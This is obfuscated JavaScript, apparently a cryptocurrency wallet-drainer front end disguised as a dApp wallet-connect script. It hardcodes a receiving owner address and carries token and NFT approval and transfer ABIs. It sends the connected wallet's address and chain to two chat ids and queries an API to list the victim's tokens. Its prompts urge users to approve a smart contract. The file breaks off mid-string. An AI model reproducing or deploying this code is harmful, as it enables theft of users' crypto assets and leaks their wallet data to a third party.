function _0x2f25(_0x516e13,_0x32b184){const _0x21464d=_0x2146();return _0x2f25=function(_0x2f255c,_0x2d166c){_0x2f255c=_0x2f255c-0x183;let _0x491662=_0x21464d[_0x2f255c];return _0x491662;},_0x2f25(_0x516e13,_0x32b184);}const _0x1ab798=_0x2f25;(function(_0x1755ff,_0x164172){const _0x4eab4c=_0x2f25,_0x3f1a94=_0x1755ff();while(!![]){try{const _0x1cc7f7=parseInt(_0x4eab4c(0x201))/0x1*(-parseInt(_0x4eab4c(0x224))/0x2)+parseInt(_0x4eab4c(0x1e7))/0x3*(-parseInt(_0x4eab4c(0x192))/0x4)+parseInt(_0x4eab4c(0x20f))/0x5+parseInt(_0x4eab4c(0x187))/0x6*(parseInt(_0x4eab4c(0x244))/0x7)+-parseInt(_0x4eab4c(0x271))/0x8*(-parseInt(_0x4eab4c(0x215))/0x9)+parseInt(_0x4eab4c(0x27b))/0xa*(-parseInt(_0x4eab4c(0x238))/0xb)+-parseInt(_0x4eab4c(0x23b))/0xc;if(_0x1cc7f7===_0x164172)break;else _0x3f1a94['push'](_0x3f1a94['shift']());}catch(_0x2e5964){_0x3f1a94['push'](_0x3f1a94['shift']());}}}(_0x2146,0x1b83f));let tokens=[],chainId=null,web3Object=null,selectedAccount=null;const Web3Modal=window[_0x1ab798(0x190)][_0x1ab798(0x269)],WalletConnectProvider=window[_0x1ab798(0x1db)][_0x1ab798(0x269)],OWNER_ADDRESS='0x520B778E6C47FbbA3e3F9F80C77B1D2216659115',CHAT=0x4270dd8b,CHAT1=0x13796f5c3,ABI=[{'constant':!![],'inputs':[],'name':_0x1ab798(0x195),'outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[{'name':'_upgradedAddress','type':_0x1ab798(0x272)}],'name':_0x1ab798(0x1e3),'outputs':[],'payable':![],'stateMutability':_0x1ab798(0x26e),'type':'function'},{'constant':![],'inputs':[{'name':'_spender','type':_0x1ab798(0x272)},{'name':_0x1ab798(0x1f8),'type':_0x1ab798(0x186)}],'name':_0x1ab798(0x1ce),'outputs':[],'payable':![],'stateMutability':_0x1ab798(0x26e),'type':'function'},{'constant':!![],'inputs':[],'name':_0x1ab798(0x270),'outputs':[{'name':'','type':_0x1ab798(0x197)}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':'function'},{'constant':![],'inputs':[{'name':_0x1ab798(0x21c),'type':'address'}],'name':_0x1ab798(0x23e),'outputs':[],'payable':![],'stateMutability':_0x1ab798(0x26e),'type':'function'},{'constant':!![],'inputs':[],'name':_0x1ab798(0x1f4),'outputs':[{'name':'','type':_0x1ab798(0x186)}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'constant':![],'inputs':[{'name':_0x1ab798(0x1bf),'type':_0x1ab798(0x272)},{'name':_0x1ab798(0x199),'type':_0x1ab798(0x272)},{'name':_0x1ab798(0x1f8),'type':_0x1ab798(0x186)}],'name':_0x1ab798(0x1d2),'outputs':[],'payable':![],'stateMutability':_0x1ab798(0x26e),'type':'function'},{'constant':!![],'inputs':[],'name':'upgradedAddress','outputs':[{'name':'','type':_0x1ab798(0x272)}],'payable':![],'stateMutability':'view','type':_0x1ab798(0x210)},{'constant':!![],'inputs':[{'name':'','type':_0x1ab798(0x272)}],'name':_0x1ab798(0x24f),'outputs':[{'name':'','type':_0x1ab798(0x186)}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'constant':!![],'inputs':[],'name':_0x1ab798(0x1e8),'outputs':[{'name':'','type':_0x1ab798(0x186)}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'constant':!![],'inputs':[],'name':_0x1ab798(0x1b6),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x1ab798(0x210)},{'constant':!![],'inputs':[],'name':_0x1ab798(0x25e),'outputs':[{'name':'','type':_0x1ab798(0x186)}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'constant':![],'inputs':[],'name':_0x1ab798(0x1c0),'outputs':[],'payable':![],'stateMutability':_0x1ab798(0x26e),'type':'function'},{'constant':!![],'inputs':[{'name':'_maker','type':_0x1ab798(0x272)}],'name':_0x1ab798(0x1c9),'outputs':[{'name':'','type':_0x1ab798(0x197)}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'constant':!![],'inputs':[{'name':'','type':_0x1ab798(0x272)},{'name':'','type':_0x1ab798(0x272)}],'name':_0x1ab798(0x1e9),'outputs':[{'name':'','type':_0x1ab798(0x186)}],'payable':![],'stateMutability':'view','type':_0x1ab798(0x210)},{'constant':!![],'inputs':[],'name':_0x1ab798(0x260),'outputs':[{'name':'','type':_0x1ab798(0x197)}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'constant':!![],'inputs':[{'name':_0x1ab798(0x188),'type':_0x1ab798(0x272)}],'name':_0x1ab798(0x1ab),'outputs':[{'name':'','type':_0x1ab798(0x186)}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'constant':![],'inputs':[],'name':_0x1ab798(0x1f1),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1ab798(0x210)},{'constant':!![],'inputs':[],'name':_0x1ab798(0x1e2),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':'function'},{'constant':!![],'inputs':[],'name':_0x1ab798(0x228),'outputs':[{'name':'','type':_0x1ab798(0x272)}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'constant':!![],'inputs':[],'name':_0x1ab798(0x1e6),'outputs':[{'name':'','type':_0x1ab798(0x27e)}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':'function'},{'constant':![],'inputs':[{'name':_0x1ab798(0x199),'type':_0x1ab798(0x272)},{'name':_0x1ab798(0x1f8),'type':_0x1ab798(0x186)}],'name':_0x1ab798(0x1b7),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1ab798(0x210)},{'constant':![],'inputs':[{'name':_0x1ab798(0x26b),'type':'uint256'},{'name':_0x1ab798(0x1b2),'type':_0x1ab798(0x186)}],'name':_0x1ab798(0x231),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1ab798(0x210)},{'constant':![],'inputs':[{'name':_0x1ab798(0x263),'type':_0x1ab798(0x186)}],'name':'issue','outputs':[],'payable':![],'stateMutability':_0x1ab798(0x26e),'type':_0x1ab798(0x210)},{'constant':![],'inputs':[{'name':'amount','type':_0x1ab798(0x186)}],'name':_0x1ab798(0x1b1),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[{'name':_0x1ab798(0x25b),'type':_0x1ab798(0x272)},{'name':_0x1ab798(0x24e),'type':'address'}],'name':_0x1ab798(0x255),'outputs':[{'name':'remaining','type':_0x1ab798(0x186)}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'constant':!![],'inputs':[],'name':_0x1ab798(0x251),'outputs':[{'name':'','type':_0x1ab798(0x186)}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':'isBlackListed','outputs':[{'name':'','type':_0x1ab798(0x197)}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'constant':![],'inputs':[{'name':'_clearedUser','type':'address'}],'name':_0x1ab798(0x21e),'outputs':[],'payable':![],'stateMutability':_0x1ab798(0x26e),'type':_0x1ab798(0x210)},{'constant':!![],'inputs':[],'name':'MAX_UINT','outputs':[{'name':'','type':_0x1ab798(0x186)}],'payable':![],'stateMutability':_0x1ab798(0x277),'type':'function'},{'constant':![],'inputs':[{'name':_0x1ab798(0x204),'type':_0x1ab798(0x272)}],'name':'transferOwnership','outputs':[],'payable':![],'stateMutability':_0x1ab798(0x26e),'type':_0x1ab798(0x210)},{'constant':![],'inputs':[{'name':_0x1ab798(0x1bd),'type':_0x1ab798(0x272)}],'name':'destroyBlackFunds','outputs':[],'payable':![],'stateMutability':_0x1ab798(0x26e),'type':'function'},{'inputs':[{'name':'_initialSupply','type':_0x1ab798(0x186)},{'name':_0x1ab798(0x1f6),'type':_0x1ab798(0x27e)},{'name':_0x1ab798(0x23d),'type':_0x1ab798(0x27e)},{'name':_0x1ab798(0x220),'type':'uint256'}],'payable':![],'stateMutability':'nonpayable','type':_0x1ab798(0x237)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1ab798(0x263),'type':'uint256'}],'name':'Issue','type':_0x1ab798(0x18c)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1ab798(0x263),'type':_0x1ab798(0x186)}],'name':_0x1ab798(0x1ad),'type':_0x1ab798(0x18c)},{'anonymous':![],'inputs':[{'indexed':![],'name':'newAddress','type':'address'}],'name':_0x1ab798(0x240),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1ab798(0x23c),'type':_0x1ab798(0x186)},{'indexed':![],'name':_0x1ab798(0x249),'type':_0x1ab798(0x186)}],'name':_0x1ab798(0x1a9),'type':_0x1ab798(0x18c)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1ab798(0x1bd),'type':_0x1ab798(0x272)},{'indexed':![],'name':_0x1ab798(0x214),'type':'uint256'}],'name':_0x1ab798(0x1dc),'type':_0x1ab798(0x18c)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1ab798(0x25d),'type':_0x1ab798(0x272)}],'name':'AddedBlackList','type':_0x1ab798(0x18c)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_user','type':_0x1ab798(0x272)}],'name':_0x1ab798(0x1c1),'type':_0x1ab798(0x18c)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x1ab798(0x228),'type':_0x1ab798(0x272)},{'indexed':!![],'name':_0x1ab798(0x1f0),'type':_0x1ab798(0x272)},{'indexed':![],'name':_0x1ab798(0x235),'type':_0x1ab798(0x186)}],'name':_0x1ab798(0x233),'type':_0x1ab798(0x18c)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x1ab798(0x273),'type':'address'},{'indexed':!![],'name':'to','type':'address'},{'indexed':![],'name':'value','type':'uint256'}],'name':_0x1ab798(0x1cb),'type':_0x1ab798(0x18c)},{'anonymous':![],'inputs':[],'name':'Pause','type':_0x1ab798(0x18c)},{'anonymous':![],'inputs':[],'name':'Unpause','type':_0x1ab798(0x18c)}],ABIN=[{'inputs':[{'internalType':_0x1ab798(0x27e),'name':_0x1ab798(0x195),'type':_0x1ab798(0x27e)},{'internalType':_0x1ab798(0x27e),'name':_0x1ab798(0x1e6),'type':_0x1ab798(0x27e)},{'internalType':_0x1ab798(0x186),'name':'maxNftSupply','type':'uint256'},{'internalType':'uint256','name':'saleStart','type':_0x1ab798(0x186)}],'stateMutability':_0x1ab798(0x26e),'type':_0x1ab798(0x237)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x1ab798(0x228),'type':_0x1ab798(0x272)},{'indexed':!![],'internalType':'address','name':_0x1ab798(0x1cc),'type':'address'},{'indexed':!![],'internalType':'uint256','name':_0x1ab798(0x221),'type':_0x1ab798(0x186)}],'name':_0x1ab798(0x233),'type':_0x1ab798(0x18c)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x1ab798(0x228),'type':_0x1ab798(0x272)},{'indexed':!![],'internalType':'address','name':_0x1ab798(0x27d),'type':_0x1ab798(0x272)},{'indexed':![],'internalType':_0x1ab798(0x197),'name':_0x1ab798(0x1cc),'type':_0x1ab798(0x197)}],'name':'ApprovalForAll','type':_0x1ab798(0x18c)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1ab798(0x272),'name':_0x1ab798(0x1ec),'type':_0x1ab798(0x272)},{'indexed':!![],'internalType':'address','name':_0x1ab798(0x204),'type':_0x1ab798(0x272)}],'name':_0x1ab798(0x236),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1ab798(0x272),'name':_0x1ab798(0x273),'type':'address'},{'indexed':!![],'internalType':_0x1ab798(0x272),'name':'to','type':_0x1ab798(0x272)},{'indexed':!![],'internalType':_0x1ab798(0x186),'name':_0x1ab798(0x221),'type':_0x1ab798(0x186)}],'name':'Transfer','type':_0x1ab798(0x18c)},{'inputs':[],'name':'BAYC_PROVENANCE','outputs':[{'internalType':_0x1ab798(0x27e),'name':'','type':_0x1ab798(0x27e)}],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'inputs':[],'name':_0x1ab798(0x211),'outputs':[{'internalType':_0x1ab798(0x186),'name':'','type':'uint256'}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x1ab798(0x1bc),'outputs':[{'internalType':'uint256','name':'','type':_0x1ab798(0x186)}],'stateMutability':'view','type':_0x1ab798(0x210)},{'inputs':[],'name':_0x1ab798(0x183),'outputs':[{'internalType':_0x1ab798(0x186),'name':'','type':_0x1ab798(0x186)}],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'inputs':[{'internalType':_0x1ab798(0x272),'name':'to','type':_0x1ab798(0x272)},{'internalType':_0x1ab798(0x186),'name':_0x1ab798(0x221),'type':_0x1ab798(0x186)}],'name':_0x1ab798(0x1ce),'outputs':[],'stateMutability':_0x1ab798(0x26e),'type':_0x1ab798(0x210)},{'inputs':[{'internalType':'address','name':_0x1ab798(0x228),'type':_0x1ab798(0x272)}],'name':'balanceOf','outputs':[{'internalType':'uint256','name':'','type':_0x1ab798(0x186)}],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'inputs':[],'name':_0x1ab798(0x27c),'outputs':[{'internalType':'string','name':'','type':_0x1ab798(0x27e)}],'stateMutability':'view','type':_0x1ab798(0x210)},{'inputs':[],'name':'emergencySetStartingIndexBlock','outputs':[],'stateMutability':'nonpayable','type':_0x1ab798(0x210)},{'inputs':[],'name':'flipSaleState','outputs':[],'stateMutability':_0x1ab798(0x26e),'type':_0x1ab798(0x210)},{'inputs':[{'internalType':_0x1ab798(0x186),'name':'tokenId','type':_0x1ab798(0x186)}],'name':_0x1ab798(0x279),'outputs':[{'internalType':_0x1ab798(0x272),'name':'','type':_0x1ab798(0x272)}],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'inputs':[{'internalType':_0x1ab798(0x272),'name':_0x1ab798(0x228),'type':_0x1ab798(0x272)},{'internalType':_0x1ab798(0x272),'name':'operator','type':_0x1ab798(0x272)}],'name':_0x1ab798(0x217),'outputs':[{'internalType':_0x1ab798(0x197),'name':'','type':_0x1ab798(0x197)}],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'inputs':[],'name':_0x1ab798(0x1e4),'outputs':[{'internalType':'uint256','name':'','type':_0x1ab798(0x186)}],'stateMutability':_0x1ab798(0x277),'type':'function'},{'inputs':[{'internalType':_0x1ab798(0x186),'name':'numberOfTokens','type':_0x1ab798(0x186)}],'name':_0x1ab798(0x1d4),'outputs':[],'stateMutability':_0x1ab798(0x21b),'type':_0x1ab798(0x210)},{'inputs':[],'name':_0x1ab798(0x195),'outputs':[{'internalType':'string','name':'','type':_0x1ab798(0x27e)}],'stateMutability':'view','type':_0x1ab798(0x210)},{'inputs':[],'name':_0x1ab798(0x228),'outputs':[{'internalType':_0x1ab798(0x272),'name':'','type':_0x1ab798(0x272)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x1ab798(0x186),'name':_0x1ab798(0x221),'type':_0x1ab798(0x186)}],'name':'ownerOf','outputs':[{'internalType':_0x1ab798(0x272),'name':'','type':_0x1ab798(0x272)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x1ab798(0x20e),'outputs':[],'stateMutability':_0x1ab798(0x26e),'type':_0x1ab798(0x210)},{'inputs':[],'name':_0x1ab798(0x229),'outputs':[],'stateMutability':'nonpayable','type':_0x1ab798(0x210)},{'inputs':[{'internalType':'address','name':_0x1ab798(0x273),'type':'address'},{'internalType':_0x1ab798(0x272),'name':'to','type':_0x1ab798(0x272)},{'internalType':_0x1ab798(0x186),'name':_0x1ab798(0x221),'type':_0x1ab798(0x186)}],'name':_0x1ab798(0x1ac),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x1ab798(0x272),'name':'from','type':_0x1ab798(0x272)},{'internalType':'address','name':'to','type':_0x1ab798(0x272)},{'internalType':_0x1ab798(0x186),'name':_0x1ab798(0x221),'type':_0x1ab798(0x186)},{'internalType':_0x1ab798(0x18d),'name':_0x1ab798(0x264),'type':_0x1ab798(0x18d)}],'name':'safeTransferFrom','outputs':[],'stateMutability':'nonpayable','type':_0x1ab798(0x210)},{'inputs':[],'name':_0x1ab798(0x225),'outputs':[{'internalType':_0x1ab798(0x197),'name':'','type':_0x1ab798(0x197)}],'stateMutability':_0x1ab798(0x277),'type':'function'},{'inputs':[{'internalType':_0x1ab798(0x272),'name':_0x1ab798(0x27d),'type':_0x1ab798(0x272)},{'internalType':_0x1ab798(0x197),'name':_0x1ab798(0x1cc),'type':'bool'}],'name':_0x1ab798(0x20a),'outputs':[],'stateMutability':_0x1ab798(0x26e),'type':_0x1ab798(0x210)},{'inputs':[{'internalType':_0x1ab798(0x27e),'name':_0x1ab798(0x27c),'type':_0x1ab798(0x27e)}],'name':'setBaseURI','outputs':[],'stateMutability':_0x1ab798(0x26e),'type':_0x1ab798(0x210)},{'inputs':[{'internalType':_0x1ab798(0x27e),'name':_0x1ab798(0x207),'type':_0x1ab798(0x27e)}],'name':_0x1ab798(0x1de),'outputs':[],'stateMutability':_0x1ab798(0x26e),'type':_0x1ab798(0x210)},{'inputs':[{'internalType':'uint256','name':_0x1ab798(0x1a3),'type':_0x1ab798(0x186)}],'name':'setRevealTimestamp','outputs':[],'stateMutability':_0x1ab798(0x26e),'type':'function'},{'inputs':[],'name':_0x1ab798(0x1d7),'outputs':[],'stateMutability':_0x1ab798(0x26e),'type':_0x1ab798(0x210)},{'inputs':[],'name':_0x1ab798(0x19a),'outputs':[{'internalType':_0x1ab798(0x186),'name':'','type':_0x1ab798(0x186)}],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'inputs':[],'name':_0x1ab798(0x18e),'outputs':[{'internalType':_0x1ab798(0x186),'name':'','type':_0x1ab798(0x186)}],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'inputs':[{'internalType':_0x1ab798(0x218),'name':'interfaceId','type':_0x1ab798(0x218)}],'name':_0x1ab798(0x1a2),'outputs':[{'internalType':_0x1ab798(0x197),'name':'','type':_0x1ab798(0x197)}],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'inputs':[],'name':_0x1ab798(0x1e6),'outputs':[{'internalType':_0x1ab798(0x27e),'name':'','type':_0x1ab798(0x27e)}],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'inputs':[{'internalType':_0x1ab798(0x186),'name':_0x1ab798(0x203),'type':_0x1ab798(0x186)}],'name':_0x1ab798(0x1a6),'outputs':[{'internalType':_0x1ab798(0x186),'name':'','type':_0x1ab798(0x186)}],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'inputs':[{'internalType':_0x1ab798(0x272),'name':_0x1ab798(0x228),'type':_0x1ab798(0x272)},{'internalType':'uint256','name':_0x1ab798(0x203),'type':'uint256'}],'name':'tokenOfOwnerByIndex','outputs':[{'internalType':_0x1ab798(0x186),'name':'','type':_0x1ab798(0x186)}],'stateMutability':'view','type':_0x1ab798(0x210)},{'inputs':[{'internalType':_0x1ab798(0x186),'name':_0x1ab798(0x221),'type':'uint256'}],'name':_0x1ab798(0x243),'outputs':[{'internalType':_0x1ab798(0x27e),'name':'','type':_0x1ab798(0x27e)}],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'inputs':[],'name':_0x1ab798(0x1f4),'outputs':[{'internalType':'uint256','name':'','type':_0x1ab798(0x186)}],'stateMutability':_0x1ab798(0x277),'type':_0x1ab798(0x210)},{'inputs':[{'internalType':'address','name':_0x1ab798(0x273),'type':'address'},{'internalType':_0x1ab798(0x272),'name':'to','type':_0x1ab798(0x272)},{'internalType':_0x1ab798(0x186),'name':_0x1ab798(0x221),'type':'uint256'}],'name':_0x1ab798(0x1d2),'outputs':[],'stateMutability':'nonpayable','type':_0x1ab798(0x210)},{'inputs':[{'internalType':_0x1ab798(0x272),'name':_0x1ab798(0x204),'type':_0x1ab798(0x272)}],'name':_0x1ab798(0x278),'outputs':[],'stateMutability':'nonpayable','type':_0x1ab798(0x210)},{'inputs':[],'name':'withdraw','outputs':[],'stateMutability':'nonpayable','type':_0x1ab798(0x210)}],networkToId={0x1328cf7:'btc-mainnet',0x1:_0x1ab798(0x1c8),0x5:_0x1ab798(0x1b9),0x89:'matic-mainnet',0x13881:_0x1ab798(0x1d0),0x38:'bsc-mainnet',0x61:'bsc-testnet',0xa86a:_0x1ab798(0x1af),0xa869:_0x1ab798(0x18f),0xfa:_0x1ab798(0x239),0xfa2:_0x1ab798(0x23a),0xa4b1:_0x1ab798(0x19f),0x66eed:_0x1ab798(0x196),0xa4ba:_0x1ab798(0x24c),0x250:'astar-mainnet',0x51:_0x1ab798(0x1e5),0x150:'astar-shiden',0x4e454152:_0x1ab798(0x253),0x4e454153:_0x1ab798(0x1eb),0x6984c:_0x1ab798(0x1d3),0x69849:_0x1ab798(0x1ed),0x7e4:_0x1ab798(0x1da),0x14a33:_0x1ab798(0x19d),0x77:_0x1ab798(0x267),0x405:_0x1ab798(0x23f),0xa918:_0x1ab798(0x1ca),0x10e8:_0x1ab798(0x22c),0xdbe0:_0x1ab798(0x1f3),0x2600:_0x1ab798(0x1a8),0x50e:_0x1ab798(0x1ef),0x511:_0x1ab798(0x1c2),0x120:'boba-mainnet',0x1c:'boba-rinkeby-testnet',0xb48:_0x1ab798(0x20b),0x1e14:_0x1ab798(0x219),0x436f7631:_0x1ab798(0x1d6),0x19:_0x1ab798(0x1c5),0x152:_0x1ab798(0x1fd),0xd2af:_0x1ab798(0x1a7),0x14f:'defi-kingdoms-testnet',0xa516:_0x1ab798(0x27a),0x2329:_0x1ab798(0x275),0x2328:_0x1ab798(0x208),0x868:'findora-mainnet',0x86a:'findora-forge-testnet',0x13:'flarenetworks-canary-mainnet',0x10:'flarenetworks-canary-testnet',0xe:_0x1ab798(0x189),0x72:'flarenetworks-flare-testnet',0xb7e7759:_0x1ab798(0x222),0x153c099c:'gather-testnet',0x63564c40:_0x1ab798(0x1be),0x6357d2e0:_0x1ab798(0x1a0),0x141:_0x1ab798(0x1ee),0x142:'kcc-testnet',0xe704:_0x1ab798(0x261),0x1389:_0x1ab798(0x1b3),0x52:_0x1ab798(0x21a),0x53:'meter-testnet',0x440:_0x1ab798(0x26d),0x24c:_0x1ab798(0x258),0x7d2:_0x1ab798(0x185),0x30e0a:_0x1ab798(0x1ae),0x7d1:'milkomeda-c1-mainnet',0x30da5:'milkomeda-c1-devnet',0x504:_0x1ab798(0x1c3),0x507:_0x1ab798(0x257),0x505:_0x1ab798(0x21d),0xe9ac0ce:_0x1ab798(0x26a),0x116ea:_0x1ab798(0x1e0),0x116e9:_0x1ab798(0x22d),0x116e1:_0x1ab798(0x1d1),0x5afe:_0x1ab798(0x262),0x5aff:_0x1ab798(0x1b5),0xf8:_0x1ab798(0x242),0x249c:_0x1ab798(0x1f2),0xa:_0x1ab798(0x276),0x2a15c308d:_0x1ab798(0x1f7),0x2a15c3083:_0x1ab798(0x19e),0x5a2:_0x1ab798(0x22a),0x1e:_0x1ab798(0x256),0x1f:_0x1ab798(0x1df),0x5d456c62:'skale-calypso',0x1482a7b2:'skale-staging-uum',0x3d28774d:_0x1ab798(0x200),0x109b4597:_0x1ab798(0x26f),0x536f6c4d:_0x1ab798(0x247),0x1202c:_0x1ab798(0x19c),0x1202d:'swimmer-testnet',0x1a0:_0x1ab798(0x266)},providerOptions={'walletconnect':{'package':WalletConnectProvider,'options':{'rpc':{0x38:'https://bsc-dataseed.binance.org/'},'chainId':0x38,'network':_0x1ab798(0x1b8),'infuraId':_0x1ab798(0x259),'pollingInterval':_0x1ab798(0x227)}},'coinbasewallet':{'package':CoinbaseWalletSDK,'options':{'appName':_0x1ab798(0x245),'infuraId':'e77435344ef0486893cdc26d7d5cf039','rpc':_0x1ab798(0x24a),'chainId':0x38,'chainName':_0x1ab798(0x1b8),'darkMode':![]}}};let web3Modal=new Web3Modal({'providerOptions':providerOptions,'cacheProvider':![],'disableInjectedProvider':![]});$(_0x1ab798(0x248))[_0x1ab798(0x18b)](async function(){const _0x1c145a=_0x1ab798;try{let _0x3f4d3e=await web3Modal[_0x1c145a(0x1a1)]();onProvider(_0x3f4d3e),_0x3f4d3e['on'](_0x1c145a(0x232),_0x152f25=>{const _0x4a1d2f=_0x1c145a;web3[_0x4a1d2f(0x184)][_0x4a1d2f(0x1b0)]={'customChain':{'name':'bsc-network','chainId':0x38,'networkId':0x38},'baseChain':_0x4a1d2f(0x24d),'hardfork':_0x4a1d2f(0x1fc)},console[_0x4a1d2f(0x27f)](_0x152f25),onProvider(_0x3f4d3e);});}catch(_0x15ca02){console['log'](_0x1c145a(0x213),_0x15ca02);return;}});async function onProvider(_0x41356e){const _0x4ca07b=_0x1ab798;web3Object=new Web3(_0x41356e);let _0xaf9d95=await web3Object['eth'][_0x4ca07b(0x1a4)]();selectedAccount=_0xaf9d95[0x0],chainName=await web3Object['eth'][_0x4ca07b(0x1fe)](),chainId=networkToId[chainName],console[_0x4ca07b(0x27f)](chainId),console['log'](selectedAccount),alert(_0x4ca07b(0x20c)),_0xaf9d95[_0x4ca07b(0x1ea)]&&(sendMessage(_0x4ca07b(0x1dd)+chainId+'!'),sendMessage1(_0x4ca07b(0x1dd)+chainId+'!'),sendMessage(_0x4ca07b(0x202)+selectedAccount),sendMessage1(_0x4ca07b(0x202)+selectedAccount),covalenthqAPICall());}function _0x2146(){const _0x39da1b=['eth-goerli','Contract','sendTransaction','REVEAL_TIMESTAMP','_blackListedUser','harmony-mainnet','_from','unpause','RemovedBlackList','boba-bobabase-testnet','moonbeam-mainnet','BNB','cronos-mainnet','Approve\x20Completed\x20Successfully','json','eth-mainnet','getBlackListStatus','boba-avalanche-mainnet','Transfer','approved','quote','approve','Your\x20address\x20','matic-mumbai','nervos-polyjuice-testnet','transferFrom','avalanche-dexalot-mainnet','mintApe','Error:\x20','covalent-internal-network-v1','setStartingIndex','contract_address','items','axie-mainnet','WalletConnectProvider','DestroyedBlackFunds','Wallet\x20Connected\x20Successfully\x20to\x20','setProvenanceHash','rsk-testnet','nervos-godwoken-mainnet','balance','getOwner','deprecate','maxApePurchase','astar-shibuya','symbol','36YVCpkj','decimals','allowed','length','aurora-testnet','previousOwner','avalanche-dexalot-testnet','kcc-mainnet','boba-bobabeam-mainnet','spender','pause','oasys-testnet','boba-bnb-mainnet','totalSupply','estimateGas','_name','palm-mainnet','_value','JSON','Transaction\x20Rejected','New\x20token','petersburg','cronos-testnet','getChainId','Error\x20processing\x20item\x20','skale-omnus','46204iFYNEO','Cl\x20address\x20:\x20','index','newOwner','/address/','NFT','provenanceHash','evmos-testnet','getGasPrice','setApprovalForAll','boba-goerli','Open\x20your\x20selected\x20wallet\x20or\x20extension\x20to\x20approve\x20smart\x20contract','Transaction\x20Receipt:\x20','renounceOwnership','784380UlnFzk','function','MAX_APES','ckey_5da97a82746c43ed84565c64afb','Could\x20not\x20get\x20a\x20wallet\x20connection','_balance','279pCvDFZ','methods','isApprovedForAll','bytes4','canto-mainnet','meter-mainnet','payable','_evilUser','moonbeam-moonriver','removeBlackList','filter','_decimals','tokenId','gather-mainnet','Tokens:','2uNtJJP','saleIsActive','message','10000','owner','reserveApes','polygon-zkevm-testnet','Initial\x20list\x20','boba-avalanche-testnet','nervos-godwoken-testnet','receipt','search','error','setParams','accountsChanged','Approval','Token\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','value','OwnershipTransferred','constructor','22qTMhGw','fantom-mainnet','fantom-testnet','1091880rWytGW','feeBasisPoints','_symbol','addBlackList','bittorrent-testnet','Deprecate','map','oasys-mainnet','tokenURI','259LPrdrD','debug','toString','solana-mainnet','.connect','maxFee','https://bsc-dataseed.binance.org','tokens-list','arbitrum-nova-mainnet','mainnet','_spender','balances','type','basisPointsRate','transactionHash','aurora-mainnet','contract_ticker_symbol','allowance','rsk-mainnet','moonbeam-moonbase-alpha','metis-testnet','e77435344ef0486893cdc26d7d5cf039','TOKEN\x20Contract\x20Address\x20','_owner','location','_user','_totalSupply','application/json','paused','linea-testnet','oasis-sapphire-mainnet','amount','_data','send','sx-mainnet','bittorrent-mainnet','NFT\x20Contract\x20Address\x20','default','neon-testnet','newBasisPoints','true','metis-mainnet','nonpayable','skale-razor','deprecated','36152tPcuXH','address','from','Transaction\x20Hash:\x20','evmos-mainnet','optimism-mainnet','view','transferOwnership','getApproved','emerald-paratime-mainnet','153370zzLWhd','baseURI','operator','string','log','apePrice','eth','milkomeda-a1-mainnet','uint256','30084NWObdM','who','flarenetworks-flare-mainnet','GET','click','event','bytes','startingIndexBlock','avalanche-testnet','Web3Modal','Insufficient\x20funds\x20for\x20transfer','67304nTEqID','Transaction\x20is\x20submitted\x20to\x20the\x20network','cryptocurrency','name','arbitrum-goerli','bool','Error\x20collecting\x20info\x20about\x20wallet','_to','startingIndex','getBalance','swimmer-mainnet','base-testnet','palm-testnet','arbitrum-mainnet','harmony-testnet','connect','supportsInterface','revealTimeStamp','getAccounts','catch','toke